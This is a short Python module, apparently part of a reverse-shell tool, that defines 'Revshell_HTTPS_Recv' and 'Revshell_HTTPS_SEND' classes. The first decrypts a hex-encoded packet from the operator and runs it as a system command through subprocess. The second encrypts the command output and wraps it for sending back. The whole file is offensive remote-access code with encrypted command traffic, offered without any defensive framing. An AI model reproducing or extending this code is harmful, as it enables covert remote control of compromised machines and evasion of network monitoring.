import subprocess
import Encrypt
import Decrypt

class Revshell_HTTPS_Recv:
    def __init__(self, pkt): #paquete texto
        self.pkt_crypt = bytes.fromhex(pkt)
        self.pkt_decry = Decrypt.payload_decrypt(self.pkt_crypt)
        self.comando = self.pkt_decry.decode().split()

    def pkt_exec(self):
        salida = subprocess.run(self.comando, capture_output=True, text=True)
        return salida



class Revshell_HTTPS_SEND:
    def __init__(self, output_shell):#texto 
        self.output_shell = output_shell.encode()
        self.output_shell_crypt = Encrypt.payload_encrypt(self.output_shell)#retorna binario hex

    def pkt_send(self):
        return "PKTL:"+self.output_shell_crypt.hex() #texto crudo



